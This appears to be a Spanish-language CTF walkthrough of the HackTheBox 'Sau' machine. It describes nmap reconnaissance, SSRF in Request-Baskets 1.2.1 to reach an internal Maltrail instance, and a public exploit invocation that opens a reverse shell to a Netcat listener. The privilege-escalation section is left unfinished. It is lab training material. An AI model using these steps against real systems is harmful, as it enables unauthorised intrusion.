# HackTheBox Sau Walkthrough

Este documento proporciona un walkthrough detallado para comprometer la máquina Sau en HackTheBox, destacando las técnicas y herramientas clave empleadas en cada etapa.

## Tabla de Contenidos

- [Introducción](#introducción)
- [Reconocimiento](#reconocimiento)
- [Explotación](#explotación)
  - [Explotación de SSRF en Request-Baskets](#explotación-de-ssrf-en-request-baskets)
  - [Explotando Maltrail](#explotando-maltrail)
- [Post-Explotación](#post-explotación)
- [Conclusión](#conclusión)

## Introducción

El propósito de este walkthrough es documentar el proceso seguido para comprometer la máquina Sau, enfocándose en superar varios desafíos de seguridad para obtener acceso como usuario y, finalmente, acceso total.

## Reconocimiento

El reconocimiento es el primer paso crítico en cualquier prueba de penetración. Utilicé `nmap` para identificar los puertos abiertos y los servicios en ejecución en la máquina objetivo:

nmap -sC -sV -oN nmap_initial <IP de la máquina>

Los resultados revelaron los siguientes puertos abiertos:

- **22/tcp** - SSH
- **80/tcp** - HTTP (No respondía)
- **55555/tcp** - HTTP (Accesible)

![Nmap](/img/Nmap.PNG)

El intento de acceso al servidor HTTP en el puerto 80 no cargó, pero el puerto 55555 reveló una aplicación web llamada **Request-baskets**.

![VentanaPrincipal](/img/Request-baskets.PNG)

## Explotación

### Explotación de SSRF en Request-Baskets

**Request-Baskets** es una herramienta para crear puntos finales temporales para inspeccionar solicitudes HTTP. La versión 1.2.1, que estaba en uso, es vulnerable a SSRF (Server Side Request Forgery). Aproveché esta vulnerabilidad para acceder a servicios internos, en particular, al servicio en el puerto 80.

![SSRF](/img/SSRF.PNG)

### Explotando Maltrail

El servicio interno redirigido resultó ser **Maltrail**, una aplicación web de monitoreo de tráfico malicioso. 

![Maltrail](/img/Maltrail.PNG)

Una búsqueda en Google reveló una vulnerabilidad en la versión específica en uso, permitiéndome ejecutar un reverse shell a través de un exploit disponible públicamente: https://github.com/spookier/Maltrail-v0.53-Exploit

python3 exploit.py [IP de escucha] [Puerto de escucha] [URL objetivo]

Utilicé Netcat para escuchar conexiones entrantes en el puerto especificado, lo que me permitió obtener acceso al sistema como el usuario **puma**.


## Post-Explotación

Dentro del directorio home del usuario **puma**, encontré el archivo `user.txt`, que contenía la flag de usuario.

![Usuario](/img/Usuario.PNG)

Ahora es el turno de escalar privilegios, la cual desde mi punto de vista es la parte más complicada.

Comienzo ejecutando el comando sudo -l, y observo que el usuario puma tiene permisos para ejecutar un servicio de systemctl como root.

![Sudoers](/img/sudol.PNG)

Teniendo en cuenta esto, compruebo cual es la version del servicio systemctl con el comando:

systemctl --version




## Conclusión

Este documento detalla el proceso seguido para comprometer la máquina Sau en HackTheBox, desde el reconocimiento inicial hasta la post-explotación. Este ejercicio subraya la importancia de la actualización de software y la configuración adecuada de seguridad para prevenir vulnerabilidades.


